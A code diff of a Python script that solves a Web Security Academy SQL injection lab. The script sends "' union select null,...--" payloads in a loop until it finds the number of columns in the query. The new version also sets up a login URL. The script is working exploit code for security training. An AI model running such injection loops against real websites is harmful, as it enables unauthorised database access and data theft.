@@ -13,34 +13,28 @@ import urllib
 # Web Security Academy > SQL injection > UNION attacks > Lab
 
 # URL of target
-URL = "https://ac6c1ffb1f9581c0c03208ce000a00e5.web-security-academy.net/filter?category=Corporate+gifts"
 
-found = False	# boolean flag for finding no. of cols
-addText = "null," 	# null string to test columns
+#modify here ---------
+baseURL = "https://0a9f00b003c1f9e1c1c645710024005b.web-security-academy.net"
+#modify end ----------
 
-count = 0  	# counter start
-maxCount = 20    # maximum number of cols to try
+exploitURL = baseURL + "/filter?category="
+loginURL = baseURL + "/login"
 
+found = False;
+col_index = 0  # counter for no. of columns
 
-# Lab (1) identify number of columns
+#--(i) detect columns--------------------------------------------------
+print("Detecting no of columns with union attack...")
 
-print("Detecting number of columns\n")
 while(found == False):
-
-	# The "null" string will keep incrementing until a "Success" condition is identified	
-	payload = "' union select {}null--".format(count*addText)
-	print("Trying... {} column: {}".format(count+1,payload))
-
-	res = requests.get(URL+payload)
-	data = res.text
-
-	# To identify a "Success" condition, the response 
-	# would contain the following results "product?productId"
-	# We shall search an occurence of it using the condition below 
-	if (data.count('/product?productId') > 1):
-		print("\n[+] Found! There are {} columns.".format(count+1))
-		print("[+] Payload used: {}\n".format(payload))		
+	payload = "' union select {}null--".format(col_index*'null,')
+	res = requests.get(exploitURL+payload)
+	if (res.status_code == 200):
 		found = True
 		break
+	else:
+		col_index=col_index+1
 
-	count=count+1
+col_count = col_index+1
+print("	[+] Found! Total columns detected = {}\n".format(col_count))
